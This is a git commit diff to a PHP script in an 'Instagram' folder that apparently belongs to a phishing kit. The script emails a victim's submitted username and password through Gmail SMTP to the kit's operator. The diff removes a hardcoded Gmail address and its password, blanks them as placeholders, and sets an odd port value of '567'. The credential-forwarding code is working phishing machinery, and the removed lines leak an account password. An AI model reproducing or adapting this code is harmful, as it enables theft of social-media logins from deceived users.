26e48de9cf33fd8093618328031da113636c7b4c
K.S.Sabari Nathan <68042285+sabarinathan145@users.noreply.github.com>
2021-06-14 13:55:38 +0530

    Update sendemail1.php

--- Instagram/sendemail1.php
+++ Instagram/sendemail1.php
@@ -17,16 +17,16 @@ if(isset($_POST['submit'])){
     $mail->isSMTP();
     $mail->Host = 'smtp.gmail.com';
     $mail->SMTPAuth = true;
-    $mail->Username = 'instagramcommunitygl@gmail.com'; // Gmail address which you want to use as SMTP server
-    $mail->Password = 'cocoland@18'; // Gmail address Password
+    $mail->Username = ' '; // Gmail address which you want to use as SMTP server
+    $mail->Password = ' '; // Gmail address Password
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-    $mail->Port = '587';
+    $mail->Port = '567'; //use port number '587'  or '301' if it doesn't work
 
-    $mail->setFrom('instagramcommunitygl@gmail.com'); // Gmail address which you used as SMTP server
-    $mail->addAddress('instagramcommunitygl@gmail.com'); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)
+    $mail->setFrom(' '); // Gmail address which you used as SMTP server
+    $mail->addAddress(' '); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)
 
     $mail->isHTML(true);
-    $mail->Subject = '-- facebook page --';
+    $mail->Subject = ' ';
     $mail->Body = "<h3>user name : $name <br>Password: $password </h3>";
 
     $mail->send();
